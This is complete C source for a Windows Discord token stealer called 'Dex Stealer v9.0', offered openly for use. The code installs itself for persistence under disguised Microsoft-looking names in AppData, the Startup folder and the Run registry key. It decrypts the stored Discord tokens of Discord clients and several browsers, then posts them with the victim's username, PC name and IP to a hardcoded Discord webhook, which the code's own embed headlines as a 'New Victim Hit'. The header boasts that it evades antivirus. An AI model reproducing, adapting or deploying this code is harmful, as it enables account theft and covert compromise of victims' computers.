//the stealer is a simple discord token stealer that collects tokens from various browsers and sends them to a discord webhook.
// It uses Windows APIs to ensure persistence and collects system information.
// its undetected by most antivirus software as of now.
//keep in mind that using this code for malicious purposes is illegal and unethical.
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <shlobj.h>
#include <wininet.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <string.h>
#include "sqlite3.h"
#include "cJSON.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")

#define WEBHOOK_URL L"https://discord.com/api/webhooks/1383755825436295198/goEQtnqL_f3V-46oT9jdXq6CeFIkSkLA3a9UX-3VtiJ6bz2490qBgPm98m2xKm1jv47l"
#define MASTER_FOLDER L"\\Microsoft\\SystemCert"
#define MASTER_EXE L"\\certsync.exe"
#define STARTUP_EXE L"\\MsUpdateService.exe"
#define REGISTRY_VALUE_NAME L"Microsoft CertSync"

void ensure_persistence(const wchar_t* master_path, const wchar_t* startup_path);
void send_report(const char* user, const char* pc, const char* ip, const char* tokens, int token_count);
char* get_system_info(char** user, char** pc, char** ip);
BYTE* get_master_key(const wchar_t* user_data_path);
char* find_and_decrypt_tokens(const wchar_t* path, const BYTE* master_key, int* count);
void escape_json_string(const char* input, char* output, size_t output_size);
BOOL b64_decode(const char* str, BYTE** buf, DWORD* len);
BOOL decrypt_dpapi_blob(BYTE* in, DWORD in_len, BYTE** out, DWORD* out_len);
BOOL decrypt_aes_gcm(const BYTE* key, const BYTE* nonce, const BYTE* ctext, const BYTE* tag, DWORD ctext_len, char** ptext);
char* read_file(const wchar_t* path);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    CoInitialize(NULL);

    wchar_t appdata_path[MAX_PATH], local_appdata_path[MAX_PATH], startup_folder_path[MAX_PATH];
    wchar_t master_path[MAX_PATH], startup_exe_path[MAX_PATH];
    
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata_path);
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startup_folder_path);

    swprintf_s(master_path, MAX_PATH, L"%s%s", appdata_path, MASTER_FOLDER);
    CreateDirectoryW(master_path, NULL);
    wcscat_s(master_path, MAX_PATH, MASTER_EXE);
    swprintf_s(startup_exe_path, MAX_PATH, L"%s%s", startup_folder_path, STARTUP_EXE);
    
    ensure_persistence(master_path, startup_exe_path);

    char *user = NULL, *pc = NULL, *ip = NULL;
    get_system_info(&user, &pc, &ip);

    const struct { const wchar_t* name; const wchar_t* path; BOOL is_local; } paths_to_check[] = {
        {L"Discord", L"\\discord", FALSE}, {L"Discord Canary", L"\\discordcanary", FALSE},
        {L"Discord PTB", L"\\discordptb", FALSE}, {L"Lightcord", L"\\Lightcord", FALSE},
        {L"Google Chrome", L"\\Google\\Chrome\\User Data", TRUE}, {L"Microsoft Edge", L"\\Microsoft\\Edge\\User Data", TRUE},
        {L"Brave", L"\\BraveSoftware\\Brave-Browser\\User Data", TRUE}, {L"Opera", L"\\Opera Software\\Opera Stable", FALSE},
        {L"Opera GX", L"\\Opera Software\\Opera GX Stable", FALSE}, {L"Vivaldi", L"\\Vivaldi\\User Data", TRUE},
        {L"Yandex", L"\\Yandex\\YandexBrowser\\User Data", TRUE},
    };
    int num_paths = sizeof(paths_to_check) / sizeof(paths_to_check[0]);
    int total_token_count = 0;

    char* all_tokens = (char*)malloc(8192);
    if(all_tokens) {
        all_tokens[0] = '\0';
        for (int i = 0; i < num_paths; i++) {
            wchar_t user_data_path[MAX_PATH];
            swprintf_s(user_data_path, MAX_PATH, L"%s%s", paths_to_check[i].is_local ? local_appdata_path : appdata_path, paths_to_check[i].path);
            BYTE* master_key = get_master_key(user_data_path);
            if (master_key) {
                wchar_t leveldb_path[MAX_PATH];
                swprintf_s(leveldb_path, MAX_PATH, L"%s\\Local Storage\\leveldb", user_data_path);
                
                int current_count = 0;
                char* found_tokens = find_and_decrypt_tokens(leveldb_path, master_key, &current_count);
                if (found_tokens && current_count > 0) {
                    total_token_count += current_count;
                    char header[256];
                    sprintf_s(header, sizeof(header), "**__Tokens from %S:__**\\n", paths_to_check[i].name);
                    if (strlen(all_tokens) + strlen(header) < 8192) strcat_s(all_tokens, 8192, header);
                    if (strlen(all_tokens) + strlen(found_tokens) < 8192) strcat_s(all_tokens, 8192, found_tokens);
                }
                free(found_tokens);
                free(master_key);
            }
        }
    }
    
    send_report(user, pc, ip, all_tokens, total_token_count);
    
    free(user); free(pc); free(ip);
    free(all_tokens);
    CoUninitialize();
    
    return 0;
}

void send_report(const char* user, const char* pc, const char* ip, const char* tokens, int token_count) {
    char json_payload[8192] = {0};
    char escaped_user[256], escaped_pc[256], escaped_ip[64], escaped_tokens[4096];
    char token_field_title[64];

    escape_json_string(user ? user : "N/A", escaped_user, sizeof(escaped_user));
    escape_json_string(pc ? pc : "N/A", escaped_pc, sizeof(escaped_pc));
    escape_json_string(ip ? ip : "N/A", escaped_ip, sizeof(escaped_ip));
    escape_json_string(token_count > 0 ? tokens : "No tokens found.", escaped_tokens, sizeof(escaped_tokens));
    sprintf_s(token_field_title, sizeof(token_field_title), "🔑 Tokens Found (%d)", token_count);

    char timestamp[32];
    SYSTEMTIME st; GetSystemTime(&st);
    sprintf_s(timestamp, sizeof(timestamp), "%d-%02d-%02dT%02d:%02d:%02d.000Z", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    sprintf_s(json_payload, sizeof(json_payload),
        "{\"username\": \"Dex Stealer\",\"avatar_url\": \"https://cdn.discordapp.com/attachments/1383140560641982744/1383755594564898857/Screenshot_20250614-152854.png?ex=684ff252&is=684ea0d2&hm=e47474935f3e374b8f01562920d03dae52363f253fe41cbd7e280d064bfc126d&\",\"embeds\": [{"
        "\"title\": \"💀 New Victim Hit 💀\","
        "\"color\": 9055202,"
        "\"timestamp\": \"%s\","
        "\"fields\": ["
        "{\"name\": \"💻 PC Info\", \"value\": \"**User:** %s\\n**PC:** %s\", \"inline\": true},"
        "{\"name\": \"🌐 Network\", \"value\": \"**IP:** %s\", \"inline\": true},"
        "{\"name\": \"%s\", \"value\": \"```%s```\", \"inline\": false}"
        "],"
        "\"footer\": {\"text\": \"Dex Stealer v9.0\", \"icon_url\": \"https://cdn.discordapp.com/attachments/1383140560641982744/1383755594564898857/Screenshot_20250614-152854.png?ex=684ff252&is=684ea0d2&hm=e47474935f3e374b8f01562920d03dae52363f253fe41cbd7e280d064bfc126d&\"}"
        "}]}",
        timestamp, escaped_user, escaped_pc, escaped_ip, token_field_title, escaped_tokens
    );

    HINTERNET h_session = InternetOpenW(L"Reporter", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if(h_session) {
        URL_COMPONENTSW url_comp;
        wchar_t host[256], url_path[2048];
        memset(&url_comp, 0, sizeof(url_comp));
        url_comp.dwStructSize = sizeof(url_comp);
        url_comp.lpszHostName = host; url_comp.dwHostNameLength = 256;
        url_comp.lpszUrlPath = url_path; url_comp.dwUrlPathLength = 2048;
        InternetCrackUrlW(WEBHOOK_URL, (DWORD)wcslen(WEBHOOK_URL), 0, &url_comp);

        HINTERNET h_connect = InternetConnectW(h_session, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if(h_connect) {
            HINTERNET h_request = HttpOpenRequestW(h_connect, L"POST", url_path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
            if(h_request) {
                const char* headers = "Content-Type: application/json; charset=utf-8";
                HttpSendRequestA(h_request, headers, (DWORD)strlen(headers), (LPVOID)json_payload, (DWORD)strlen(json_payload));
                InternetCloseHandle(h_request);
            }
            InternetCloseHandle(h_connect);
        }
        InternetCloseHandle(h_session);
    }
}

void ensure_persistence(const wchar_t* master_path, const wchar_t* startup_path) { wchar_t current_path[MAX_PATH]; GetModuleFileNameW(NULL, current_path, MAX_PATH); if (GetFileAttributesW(master_path) == INVALID_FILE_ATTRIBUTES) { CopyFileW(current_path, master_path, FALSE); STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi; if (CreateProcessW(master_path, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); ExitProcess(0); } } if (GetFileAttributesW(startup_path) == INVALID_FILE_ATTRIBUTES) { CopyFileW(master_path, startup_path, FALSE); } HKEY hkey = NULL; if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey) == ERROR_SUCCESS) { RegSetValueExW(hkey, REGISTRY_VALUE_NAME, 0, REG_SZ, (const BYTE*)master_path, (wcslen(master_path) + 1) * sizeof(wchar_t)); RegCloseKey(hkey); } }
void escape_json_string(const char* input, char* output, size_t output_size) { int j = 0; for (int i = 0; input[i] != '\0' && j < output_size - 3; ++i) { char c = input[i]; if (c == '"' || c == '\\') { output[j++] = '\\'; output[j++] = c; } else if (c == '\n') { output[j++] = '\\'; output[j++] = 'n'; } else if (c == '\r') { output[j++] = '\\'; output[j++] = 'r'; } else if (c == '\t') { output[j++] = '\\'; output[j++] = 't'; } else { output[j++] = c; } } output[j] = '\0'; }
char* get_system_info(char** user, char** pc, char** ip) { wchar_t user_name_w[257] = {0}, computer_name_w[257] = {0}; *user = (char*)malloc(257); *pc = (char*)malloc(257); *ip = (char*)calloc(46, 1); if(!*user || !*pc || !*ip) return NULL; DWORD size = sizeof(user_name_w)/sizeof(wchar_t); GetUserNameW(user_name_w, &size); size = sizeof(computer_name_w)/sizeof(wchar_t); GetComputerNameW(computer_name_w, &size); WideCharToMultiByte(CP_UTF8, 0, user_name_w, -1, *user, 257, NULL, NULL); WideCharToMultiByte(CP_UTF8, 0, computer_name_w, -1, *pc, 257, NULL, NULL); HINTERNET h_session = InternetOpenW(L"IP-Fetcher", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); if (h_session) { HINTERNET h_connect = InternetConnectW(h_session, L"api64.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); if (h_connect) { HINTERNET h_request = HttpOpenRequestW(h_connect, L"GET", L"/", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0); if (h_request) { DWORD read = 0; InternetReadFile(h_request, *ip, 45, &read); (*ip)[read] = '\0'; InternetCloseHandle(h_request); } InternetCloseHandle(h_connect); } InternetCloseHandle(h_session); } if(strlen(*ip) == 0) strcpy_s(*ip, 46, "N/A"); return NULL; }
BOOL b64_decode(const char* str, BYTE** buf, DWORD* len) { return CryptStringToBinaryA(str, 0, CRYPT_STRING_BASE64, NULL, len, NULL, NULL) && (*buf = (BYTE*)malloc(*len)) && CryptStringToBinaryA(str, 0, CRYPT_STRING_BASE64, *buf, len, NULL, NULL); }
BOOL decrypt_dpapi_blob(BYTE* in, DWORD in_len, BYTE** out, DWORD* out_len) { DATA_BLOB in_blob = { in_len, in }; DATA_BLOB out_blob = { 0, NULL }; if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) { *out = out_blob.pbData; *out_len = out_blob.cbData; return TRUE; } return FALSE; }
BOOL decrypt_aes_gcm(const BYTE* key, const BYTE* nonce, const BYTE* ctext, const BYTE* tag, DWORD ctext_len, char** ptext) { BCRYPT_ALG_HANDLE h_alg = NULL; BCRYPT_KEY_HANDLE h_key = NULL; BOOL ok = FALSE; if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) goto cleanup; if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) < 0) goto cleanup; if (BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, (PBYTE)key, 32, 0) < 0) goto cleanup; BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info; auth_info.cbSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO); auth_info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION; auth_info.pbNonce = (PBYTE)nonce; auth_info.cbNonce = 12; auth_info.pbTag = (PBYTE)tag; auth_info.cbTag = 16; DWORD ptext_len = 0; if (BCryptDecrypt(h_key, (PBYTE)ctext, ctext_len, &auth_info, NULL, 0, NULL, 0, &ptext_len, 0) < 0) goto cleanup; *ptext = (char*)malloc(ptext_len + 1); if (!*ptext) goto cleanup; if (BCryptDecrypt(h_key, (PBYTE)ctext, ctext_len, &auth_info, NULL, 0, (PBYTE)*ptext, ptext_len, &ptext_len, 0) < 0) { free(*ptext); *ptext = NULL; goto cleanup; } (*ptext)[ptext_len] = '\0'; ok = TRUE; cleanup: if (h_key) BCryptDestroyKey(h_key); if (h_alg) BCryptCloseAlgorithmProvider(h_alg, 0); return ok; }
char* read_file(const wchar_t* path) { HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); if (hf == INVALID_HANDLE_VALUE) return NULL; DWORD size = GetFileSize(hf, NULL); if (size == 0) { CloseHandle(hf); return NULL; } char* buf = (char*)malloc(size + 1); if (buf) { DWORD read = 0; ReadFile(hf, buf, size, &read, NULL); buf[size] = '\0'; } CloseHandle(hf); return buf; }
BYTE* get_master_key(const wchar_t* user_data_path) { wchar_t ls_path[MAX_PATH]; swprintf_s(ls_path, MAX_PATH, L"%s\\Local State", user_data_path); char* ls_content = read_file(ls_path); if (!ls_content) return NULL; cJSON* json = cJSON_Parse(ls_content); free(ls_content); if (!json) return NULL; cJSON* encrypted_key_json = cJSON_GetObjectItem(cJSON_GetObjectItem(json, "os_crypt"), "encrypted_key"); if (!cJSON_IsString(encrypted_key_json)) { cJSON_Delete(json); return NULL; } BYTE* b64_decoded = NULL; DWORD b64_len = 0; if (!b64_decode(encrypted_key_json->valuestring, &b64_decoded, &b64_len)) { cJSON_Delete(json); return NULL; } cJSON_Delete(json); BYTE* master_key = NULL; DWORD master_key_len = 0; if (!decrypt_dpapi_blob(b64_decoded + 5, b64_len - 5, &master_key, &master_key_len)) { free(b64_decoded); return NULL; } free(b64_decoded); return master_key; }
char* find_and_decrypt_tokens(const wchar_t* path, const BYTE* master_key, int* count) { char* all_found_tokens = (char*)malloc(4096); *count = 0; if(!all_found_tokens) return NULL; all_found_tokens[0] = '\0'; wchar_t search_path[MAX_PATH]; swprintf_s(search_path, MAX_PATH, L"%s\\*.ldb", path); WIN32_FIND_DATAW find_data; HANDLE hf = FindFirstFileW(search_path, &find_data); if (hf != INVALID_HANDLE_VALUE) { do { wchar_t source_path[MAX_PATH]; swprintf_s(source_path, MAX_PATH, L"%s\\%s", path, find_data.cFileName); wchar_t temp_path_dir[MAX_PATH], temp_path_file[MAX_PATH]; GetTempPathW(MAX_PATH, temp_path_dir); GetTempFileNameW(temp_path_dir, L"ldb", 0, temp_path_file); if (CopyFileW(source_path, temp_path_file, FALSE)) { char* content = read_file(temp_path_file); if (content) { char* ptr = content; while ((ptr = strstr(ptr, "dQw4w9WgXcQ:"))) { char* end = strchr(ptr, '"'); if (end) { *end = '\0'; BYTE* encrypted_token_b64; DWORD encrypted_token_b64_len; if (b64_decode(ptr + 12, &encrypted_token_b64, &encrypted_token_b64_len)) { if (encrypted_token_b64_len > 15 + 16 + 3) { const BYTE* nonce = encrypted_token_b64 + 3; const BYTE* ctext = encrypted_token_b64 + 15; DWORD ctext_len = encrypted_token_b64_len - 15 - 16; const BYTE* tag = ctext + ctext_len; char* decrypted_token; if (decrypt_aes_gcm(master_key, nonce, ctext, tag, ctext_len, &decrypted_token)) { if (strlen(all_found_tokens) + strlen(decrypted_token) + 5 < 4096) { (*count)++; strcat_s(all_found_tokens, 4096, decrypted_token); strcat_s(all_found_tokens, 4096, "\\n"); } free(decrypted_token); } } free(encrypted_token_b64); } } ptr++; } free(content); } DeleteFileW(temp_path_file); } } while (FindNextFileW(hf, &find_data)); FindClose(hf); } return all_found_tokens; }